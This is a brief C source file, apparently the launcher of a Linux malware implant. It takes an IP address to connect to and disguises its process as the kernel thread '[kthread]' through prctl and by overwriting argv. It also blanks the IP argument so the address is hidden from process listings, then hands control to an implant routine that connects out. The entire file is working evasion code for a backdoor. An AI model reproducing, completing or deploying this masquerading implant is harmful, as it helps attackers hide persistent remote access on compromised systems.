#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/prctl.h>
#include "../include/implant.h"

int main(int argc, char **argv) {
    if (argc < 2) {
        fprintf(stderr, "Error: Specify the IP address to connect to as an argument\n");
        return 1;
    }
    
    // process masquerading, change the command name associated with the proces (/proc/<pid>/comm)
    prctl(PR_SET_NAME, "[kthread]", NULL, NULL, NULL);

    strncpy(argv[0], "[kthread]", strlen(argv[0]) + 1);
    strncpy(argv[1], "\0", strlen(argv[1]));

    implant_init_n_call(argv[1]);

    return 0;
}